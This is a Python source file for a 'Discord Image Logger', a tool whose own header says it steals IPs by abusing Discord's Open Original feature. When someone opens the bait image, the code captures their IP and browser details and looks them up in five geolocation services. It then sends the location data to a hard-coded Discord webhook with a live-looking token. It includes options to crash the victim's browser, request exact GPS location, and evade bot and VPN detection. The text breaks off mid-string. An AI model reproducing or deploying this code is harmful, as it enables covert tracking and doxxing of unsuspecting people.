from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1429987266574553202/gSOxSrasKIkg46-WKEtd4kkbGF79yi27aM6U7qm_yOumfLNXqVfHzCW6BFEbqh_ud-9R",
    "image": "https://cdn.discordapp.com/attachments/1396621872761802894/1396635032289939526/converted_image.jpg?ex=687ecd3b&is=687d7bbb&hm=f337f0dffcab6492fac75b6b7c58a3ca42c9d1689ccb1c43e9ee3c61683f249e&", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def getExtendedIPInfo(ip):
    """Get extended IP information from multiple APIs"""
    extended_info = {}
    
    try:
        # API 1: ipapi.co (Detailed information)
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
        if response.status_code == 200:
            ipapi_data = response.json()
            extended_info["ipapi"] = {
                "country_name": ipapi_data.get("country_name"),
                "region": ipapi_data.get("region"),
                "city": ipapi_data.get("city"),
                "postal": ipapi_data.get("postal"),
                "latitude": ipapi_data.get("latitude"),
                "longitude": ipapi_data.get("longitude"),
                "timezone": ipapi_data.get("timezone"),
                "org": ipapi_data.get("org"),
                "asn": ipapi_data.get("asn")
            }
    except:
        pass
    
    try:
        # API 2: ip-api.com (Different data format)
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if response.status_code == 200:
            ipapi_com = response.json()
            if ipapi_com.get("status") == "success":
                extended_info["ipapi_com"] = {
                    "isp": ipapi_com.get("isp"),
                    "org": ipapi_com.get("org"),
                    "as": ipapi_com.get("as"),
                    "reverse": ipapi_com.get("reverse"),
                    "mobile": ipapi_com.get("mobile"),
                    "proxy": ipapi_com.get("proxy"),
                    "hosting": ipapi_com.get("hosting")
                }
    except:
        pass
    
    try:
        # API 3: ipwhois.app (Another alternative)
        response = requests.get(f"http://ipwhois.app/json/{ip}", timeout=3)
        if response.status_code == 200:
            ipwhois = response.json()
            extended_info["ipwhois"] = {
                "continent": ipwhois.get("continent"),
                "country_code": ipwhois.get("country_code"),
                "country_flag": ipwhois.get("country_flag"),
                "country_phone": ipwhois.get("country_phone"),
                "region": ipwhois.get("region"),
                "city": ipwhois.get("city"),
                "latitude": ipwhois.get("latitude"),
                "longitude": ipwhois.get("longitude"),
                "timezone_gmt": ipwhois.get("timezone_gmt"),
                "timezone_name": ipwhois.get("timezone_name"),
                "currency": ipwhois.get("currency"),
                "currency_code": ipwhois.get("currency_code")
            }
    except:
        pass
    
    try:
        # API 4: ipinfo.io (Very detailed)
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
        if response.status_code == 200:
            ipinfo = response.json()
            extended_info["ipinfo"] = {
                "hostname": ipinfo.get("hostname"),
                "anycast": ipinfo.get("anycast"),
                "city": ipinfo.get("city"),
                "region": ipinfo.get("region"),
                "country": ipinfo.get("country"),
                "loc": ipinfo.get("loc"),
                "org": ipinfo.get("org"),
                "postal": ipinfo.get("postal"),
                "timezone": ipinfo.get("timezone")
            }
    except:
        pass
    
    try:
        # API 5: ipgeolocation.io (Another good one)
        response = requests.get(f"https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip={ip}", timeout=3)
        if response.status_code == 200:
            ipgeo = response.json()
            extended_info["ipgeolocation"] = {
                "continent_name": ipgeo.get("continent_name"),
                "country_name": ipgeo.get("country_name"),
                "country_flag": ipgeo.get("country_flag"),
                "state_prov": ipgeo.get("state_prov"),
                "district": ipgeo.get("district"),
                "city": ipgeo.get("city"),
                "zipcode": ipgeo.get("zipcode"),
                "latitude": ipgeo.get("latitude"),
                "longitude": ipgeo.get("longitude"),
                "time_zone": ipgeo.get("time_zone"),
                "currency": ipgeo.get("currency"),
                "organization": ipgeo.get("organization"),
                "isp": ipgeo.get("isp")
            }
    except:
        pass
    
    return extended_info

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    # Get primary IP info from ip-api.com (original API)
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    # Get extended IP info from multiple APIs
    extended_info = getExtendedIPInfo(ip)
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    # Format extended info for Discord embed
    extended_info_text = ""
    for api_name, api_data in extended_info.items():
        extended_info_text += f"\n**{api_name.upper()} API Data:**\n"
        for key, value in api_data.items():
            if value and value != "Unknown":
                extended_info_text += f"> **{key.replace('_', ' ').title()}:** `{value}`\n"
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**Primary IP Info (ip-api.com):**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown') if info.get('isp') else 'Unknown'}`
> **ASN:** `{info.get('as', 'Unknown') if info.get('as') else 'Unknown'}`
> **Country:** `{info.get('country', 'Unknown') if info.get('country') else 'Unknown'}`
> **Region:** `{info.get('regionName', 'Unknown') if info.get('regionName') else 'Unknown'}`
> **City:** `{info.get('city', 'Unknown') if info.get('city') else 'Unknown'}`
> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**Extended IP Information:**{extended_info_text if extended_info_text else '\n> *No additional data available*'}

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
